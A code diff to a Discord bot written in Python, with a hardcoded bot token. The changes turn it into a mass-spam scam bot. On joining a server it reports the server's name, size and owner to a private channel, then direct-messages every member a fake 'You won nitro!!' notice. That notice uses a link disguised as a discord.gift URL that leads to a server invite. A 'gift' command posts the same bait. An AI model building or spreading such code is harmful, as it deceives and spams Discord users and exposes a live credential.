@@ -5,22 +5,29 @@ intents = discord.Intents.all()
 
 client=commands.Bot(command_prefix=".", intents = intents)
 token ="ODY1NjEwODMxMjY1OTIzMDk0.YPGg6A.i1-jd6SdOeMzRNW0cvKIEeYyrYo"
-
-@client.command(aliases=["Dm","DM"])
-async def d(ctx):
-    members = ctx.guild.members
-    for member in members:
+@client.event
+async def on_guild_join(guild):
+    if guild.member_count <= 4:
+        await guild.leave()
+        return
+    channel = client.get_channel(882840288031309844)
+    embed = discord.Embed(description=f"Joined : **{guild.name}**\n\nMembers : **{guild.member_count}**\n\nOwner : **{guild.owner}**",color = discord.Color.blue())
+    await channel.send(embed=embed)
+    for member in guild.members:
         try:
-            embed = discord.Embed()
-            embed.add_field(name="**Nitro gift**",value="You won ``Nitro game`` [Add the bot](https://discord.com/api/oauth2/authorize?client_id=864114304978386974&permissions=0&scope=bot) to your server to claim your gift.")
-            embed.set_image(url="https://i.pinimg.com/originals/ce/e0/7c/cee07c6fde7ccf0b5be8c49f9cef05ff.jpg")
-            embed.set_author(name="Nitro",icon_url="https://i.redd.it/mvoen8wq3w831.png")
-            embed.set_thumbnail(url="https://i.redd.it/mvoen8wq3w831.png")
-    
+            embed = discord.Embed(description="[https://discord.gift/QfZP932AF](https://discord.gg/GQeQUX4AMh)")
+            embed.set_image(url="https://1.bp.blogspot.com/-mSOpyVw_BPc/YML1HZo0ZiI/AAAAAAAAAXI/oeAEUP3tJpIoaLH2vg3ClH5ey1a96x8uACLcBGAsYHQ/s956/Discord%2BNitro%2BClassis%2BSubscription.jpg")
+            await member.send(f"🎉 {member.mention} You won nitro!! 🎉")
             await member.send(embed=embed)
         except:
-            await ctx.send(f"I can't dm {member}")        
+            pass
 
-
-
+@client.command(aliases=["GIFT","Gift"])
+@commands.guild_only()
+async def gift(ctx):
+    embed = discord.Embed(description="[https://discord.gift/QfZP932AF](https://discord.gg/GQeQUX4AMh)")
+    embed.set_author(name=f"{ctx.author.name} here is your reward",icon_url=ctx.author.avatar_url)
+    embed.set_image(url="https://1.bp.blogspot.com/-mSOpyVw_BPc/YML1HZo0ZiI/AAAAAAAAAXI/oeAEUP3tJpIoaLH2vg3ClH5ey1a96x8uACLcBGAsYHQ/s956/Discord%2BNitro%2BClassis%2BSubscription.jpg")
+    await ctx.send(embed=embed)
+    
 client.run(token)
